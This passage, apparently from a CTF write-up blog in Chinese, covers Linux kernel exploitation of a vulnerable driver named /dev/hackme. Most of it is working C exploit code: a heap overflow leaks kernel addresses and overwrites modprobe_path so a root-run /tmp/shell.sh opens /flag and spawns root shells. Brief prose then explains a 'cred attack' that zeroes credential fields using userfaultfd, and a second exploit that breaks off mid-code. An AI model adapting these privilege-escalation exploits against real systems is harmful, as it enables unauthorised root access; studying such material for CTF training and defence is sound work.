class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> modprobe_path = <span class="number">0xffffffff8483f960</span> - <span class="number">0xffffffff84000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   modprobe_path += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path=0x%lx\n&quot;</span>,modprobe_path);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">4</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">5</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">6</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">7</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">8</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   *((<span class="keyword">size_t</span> *)buf) = modprobe_path;</span><br><span class="line">   *((<span class="keyword">size_t</span> *)(buf+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">   kwrite(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">10</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(tmp,<span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">   kwrite(<span class="number">4</span>,tmp,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kfree(<span class="number">4</span>);</span><br><span class="line">   kfree(<span class="number">5</span>);</span><br><span class="line">   kfree(<span class="number">6</span>);</span><br><span class="line">   kfree(<span class="number">7</span>);</span><br><span class="line">   kfree(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">   system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">   sleep(<span class="number">10</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - Cred Attack</strong></p>
<p><code>cred attack</code> 的思路特别简单，扫描到 <code>cred</code> 然后将其修改</p>
<p>扫描的过程中，通常有两种定位方法：</p>
<ul>
<li>在 <code>task_struct</code> 中，通过 <code>*real_cred</code> 和 <code>*cred</code> 下方的字符串间接定位到 <code>*cred</code>，然后利用该指针获取 <code>cred</code> 的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>cred</code> 中，通过以下8个字段都等于 UID 来直接定位 <code>cred</code>（UID 通常为 1000）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br></pre></td></tr></table></figure>
<p>定位到 <code>cred</code> 以后，就可以把 [uid] - [fsgid] 这8个字段全部置空，然后把置空后的数据返回给内核</p>
<p>在这个过程中，唯一的问题就是需要的空间太大，在用户态必须用 mmap 进行分配，而 <code>copy_from_user</code> 在检测到 mmap 分配空间后就会报错</p>
<p>其实 <code>Double Fetch</code> 中的 <code>userfaultfd</code> 机制早就解决了这个问题，因为我们不需要使用它进行条件竞争，于是我们在 <code>handler</code> 里进行 <code>sleep</code> 就好</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_OFFSET 0x160000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEARCH_SIZE 0x10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page;</span><br><span class="line"><span class="keyword">uint64_t</span> fault_page_len;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(msg);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">while_getroot</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;get root&quot;</span>);</span><br><span class="line">            execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">handler</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[+] leak_handler created&quot;</span>);</span><br><span class="line">   sleep(<span class="number">0x100</span>); </span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   struct pollfd pollfd;</span></span><br><span class="line"><span class="comment">   int nready;</span></span><br><span class="line"><span class="comment">   pollfd.fd = uffd;</span></span><br><span class="line"><span class="comment">   pollfd.events = POLLIN;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   nready = poll(&amp;pollfd, 1, -1);</span></span><br><span class="line"><span class="comment">   if (nready != 1)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-] Wrong pool return value&quot;);</span></span><br><span class="line"><span class="comment">   nready = read(uffd, &amp;msg, sizeof(msg));</span></span><br><span class="line"><span class="comment">   if (nready &lt;= 0) &#123;</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]msg error!!&quot;);</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line"><span class="comment">   if (page == MAP_FAILED)</span></span><br><span class="line"><span class="comment">      errExit(&quot;[-]mmap page error!!&quot;);</span></span><br><span class="line"><span class="comment">   struct uffdio_copy uc;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   memset(page, 0, sizeof(page));</span></span><br><span class="line"><span class="comment">// memcpy(page,&amp;modprobe_path,8);</span></span><br><span class="line"><span class="comment">   uc.src = (unsigned long)page;</span></span><br><span class="line"><span class="comment">   uc.dst = (unsigned long)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);;</span></span><br><span class="line"><span class="comment">   uc.len = PAGE_SIZE;</span></span><br><span class="line"><span class="comment">   uc.mode = 0;</span></span><br><span class="line"><span class="comment">   uc.copy = 0;</span></span><br><span class="line"><span class="comment">   ioctl(uffd, UFFDIO_COPY, &amp;uc);</span></span><br><span class="line"><span class="comment">   puts(&quot;[+] leak_handler done!!&quot;);</span></span><br><span class="line"><span class="comment">   return NULL;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_userfault</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">long</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"></span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = fault_page_len;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span 